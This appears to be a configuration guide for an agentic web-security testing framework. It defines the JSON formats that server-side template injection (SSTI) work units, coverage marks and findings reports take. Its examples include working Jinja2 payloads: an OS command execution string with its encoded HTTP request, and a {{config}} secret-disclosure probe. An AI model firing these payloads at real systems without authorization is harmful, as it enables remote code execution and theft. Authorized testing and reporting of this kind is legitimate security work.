# rupu wiring for ssti-testing

Every parse/handoff step in this skill ends by producing one of:
a **work-units JSON array**, **`assets.mark`** calls, or a **`findings.report`**
call. Shapes below are canonical — reuse them verbatim.

## 1. Work units (fan-out over SSTI candidates)

`scripts/ssti_probe.py --work-units ssti-units.json` writes a clean JSON array
whose **first character is `[`** so a rupu workflow `for_each:` can JSON-parse
the file (read via `read_file`) and a lead agent can `dispatch` one child per
element. Hand the array to the `work-units` skill for normalization/splitting
before fan-out.

```json
[
  {
    "id": "ssti-example-com-greet-name",
    "title": "SSTI candidate: param 'name' at https://example.com/greet (jinja2 suspected)",
    "targets": ["https://example.com/greet?name=FUZZ"],
    "hints": {
      "param": "name",
      "method": "GET",
      "engine": "jinja2",
      "confidence": "confirmed-eval",
      "evidence_probe": "{{7*'7'}}",
      "evidence_marker": "7777777",
      "next_payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
      "reference": "exploitation.md#jinja2-python--flaskdjango-jinjaansible"
    }
  },
  {
    "id": "ssti-example-com-feedback-subject",
    "title": "SSTI candidate: POST param 'subject' at https://example.com/feedback (engine unknown)",
    "targets": ["https://example.com/feedback"],
    "hints": {
      "param": "subject",
      "method": "POST",
      "body": "subject=FUZZ&message=hi",
      "engine": "unknown",
      "confidence": "error-signal",
      "next": "run differential fingerprint tree, then tinja raw -r req.txt"
    }
  }
]
```

Rules: `id` lowercase/hyphenated and unique; `targets` are concrete URLs;
`hints` values carry everything the child agent needs to resume without
re-probing.

## 2. Coverage — `assets.mark` (see the `coverage-assets` skill)

Use the `web` profile kinds (prefix `web:`). Depth ladder:
`mapped` → `crawled` → `tested` → `exploited`. Mark the rung actually reached:
a route you injected probes into is `tested`; one where an expression
evaluated or RCE landed is `exploited`.

Site you probed:

```json
{"kind": "web:site", "coordinates": [{"t": "url", "v": "https://example.com"}], "label": "https://example.com", "depth": "mapped"}
```

Route + param you SSTI-tested:

```json
{"kind": "web:route", "coordinates": [{"t": "url", "v": "https://example.com"}, {"t": "http_route", "v": "/greet"}, {"t": "param", "v": "name"}], "label": "GET /greet?name= (SSTI probed)", "depth": "tested"}
```

Confirmed/exploited:

```json
{"kind": "web:route", "coordinates": [{"t": "url", "v": "https://example.com"}, {"t": "http_route", "v": "/greet"}, {"t": "param", "v": "name"}], "label": "GET /greet?name= (Jinja2 SSTI → RCE)", "depth": "exploited"}
```

## 3. Findings — `findings.report` (see the `finding-report` skill)

Scope `endpoint`, pinned to the affected URL; include the HTTP exchange in
evidence; classify with WSTG id and CWE (the `web` profile completeness checks
require all three). Severity: `high` for confirmed expression evaluation /
secret disclosure (`{{config}}`), `critical` for RCE.

```json
{
  "title": "Server-Side Template Injection (Jinja2) in 'name' parameter leading to RCE",
  "scope": "endpoint",
  "target_ref": "https://example.com/greet?name=",
  "severity": "critical",
  "classification": ["WSTG-INPV-18", "CWE-1336", "CWE-94"],
  "evidence": {
    "rationale": "The 'name' query parameter is rendered through Jinja2 without sanitization. The differential probe {{7*'7'}} returned 7777777 (Python string repetition — Jinja2, not Twig), and the payload {{cycler.__init__.__globals__.os.popen('id').read()}} returned the output of `id`, proving arbitrary OS command execution as the web user.",
    "request": "GET /greet?name=%7B%7Bcycler.__init__.__globals__.os.popen('id').read()%7D%7D HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    "response": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</h1>"
  }
}
```

Blind variant: put the injected request plus the interactsh JSON hit
(`{"protocol":"dns","full-id":"c8h2...oast.pro","remote-address":"203.0.113.7",...}`)
in `evidence.response`, and state the correlation in `rationale`.

`scripts/ssti_probe.py --finding finding.json` (after `--send` confirms
evaluation, or with `--engine/--rce-output` supplied manually) writes this
exact payload for submission via the `finding-report` skill.

## 4. Step → output map

| Methodology step | rupu output |
|---|---|
| Detection sweep parsed | work-units array (`--work-units`) → `work-units` skill |
| Each probed route | `assets.mark` web:route `depth=tested` |
| Engine fingerprinted | update work unit `hints.engine`; re-emit array |
| TInjA/SSTImap report parsed | work-units array + `assets.mark` depth bump |
| Evaluation / RCE confirmed | `assets.mark depth=exploited` + `findings.report` |
